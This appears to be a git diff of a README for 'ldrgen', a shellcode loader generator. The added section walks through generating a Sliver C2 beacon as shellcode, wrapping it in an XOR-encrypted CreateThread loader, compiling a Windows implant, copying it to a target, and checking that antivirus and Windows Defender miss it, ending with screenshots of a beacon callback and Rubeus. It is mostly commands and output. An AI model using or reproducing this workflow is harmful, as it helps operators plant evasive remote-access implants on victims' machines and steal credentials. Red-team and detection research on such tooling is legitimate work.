@@ -31,26 +31,65 @@ These are globally accessible variables via loader templates, and will be replac
     - `extern unsigned char shellcode[];`
     - `extern size_t shellcode_size;`
 
-## Example (Sliver Session)
-1. Generate shellcode
-- `-l` -> disable symbol obfuscation (enable this if injection is flagged)
-- `--format shellcode` -> output as .bin file
-- `-G` -> optional: disable [shigata-ga-nai](https://unprotect.it/technique/shikata-ga-nai-sgn/#:~:text=Shikata%20Ga%20Nai%20(SGN)%20is,a%20self%2Ddecoding%20obfuscated%20shellcode.) (requires RWX memory, check loader support)
+## Usage 
+```bash
+git clone https://github.com/gatariee/ldrgen
+cd ./ldrgen
+go build -o ldr .
+./ldr --help
+```
 
-![generate shellcode](./assets/3e27d7894ec76ece20e41fd290df7ded.png)
+## Example (calc.exe)
+```bash
+./ldr -bin ./dev/calc_shellcode/calc.bin -out ./output -ldr CreateThread_Xor -enc xor -key SuperSecureKey1234 --cleanup
+cd output && make x64
+```
 
-2. `./ldr -b <bin_path> -o <out_file> -ldr <loader_type> -enc <encryption_type> -key <encryption_key>`
+## Example (sliver beacon)
 
-![generate loader](./assets/beb0f93fce10788ff4fafa558c7bec54.png)
+### Sliver Shellcode Generation
+```bash
+sliver > generate beacon --http <listener_ip> --format shellcode
+```
+![shellcode_gen](./assets/126b19d26d4e3af6573a5f5bc2802f84.png)
 
-3. loader source code will be generated in `out_file`
+### Loader Generation
+```bash
+./ldr -bin SEMANTIC_CUPOLA.bin -out output -ldr CreateThread_Xor -enc xor -key aahduiahsdgiasudhagsdashdasgjdhka --cleanup
+```
+![ldr_gen_1](./assets/b48b971be9df335205f1d3f7a9c768d4.png)
+- binfile -> **SEMANTIC_CUPOLA.bin**
+- output to -> **./output**
+- use technique -> **CreateThread**
+- with encryption: **xor**
+- with key: **aahduiahsdgiasudhagsdashdasgjdhka**
+- delete tempfiles after compilation: **true**
 
-![loader source code](./assets/d76dc3645cf50997bf17ba2c28ed3565.png)
+### Compilation
+```bash
+cd output && make x64
+```
+![ldr_gen_2](./assets/da7bf205f86324a0a7275d57760fb7db.png)
 
-4. compile & run the loader
+- compile for x64 windows, alternatively compile for x86 with `make x86` (make sure your shellcode arch is the same as the loader arch)
 
-![run](./assets/bad05d44ec8a4ad5b361d0e5eb3bf2a3.png)
+![ldr_gen_3](./assets/6b69c6bb7c677ff7b9ea7f2cd6ea1692.png)
 
-5. profit?
+### Beacon
+Copy `implant_x64.exe` to your target, see: [here](https://gitbook.seguranca-informatica.pt/cheat-sheet-1/stuff/file-transfer).
 
-![profit](./assets/c2f1fd7a899c87ffd61303b6d46a6e2b.png)
+If you're worried about detections, run your implant through AV before deploying it to your target. (avoid VT if you care about getting sigged, but I'll use it cos I'm lazy.)
+
+![vt](./assets/80f44df4910f31c74259ccfbddc7f97d.png)
+*https://www.virustotal.com/gui/file/a88b7bee6e5dab73f158093d9f4ec9e556bd6984689efac44bafe3f600020b66?nocache=1*
+
+This should be fine for Windows Defender.
+![windef](./assets/9a6355fc57ae8c9afb8bf9f73bc8e71a.png)
+
+### Beacon Callback
+![sliver_callback](./assets/207cde0dd0375bfa437d937ca7414e2b.png)
+![sliver_rubeus](./assets/619e6ee387d2bfe44f4927f8f53054a1.png)
+
+### OPSEC
+- This tool **helps** with **generating loaders** using templates, it **does not** help with **OPSEC**. 
+- Evasive features of the loader is up to the operator to implement.
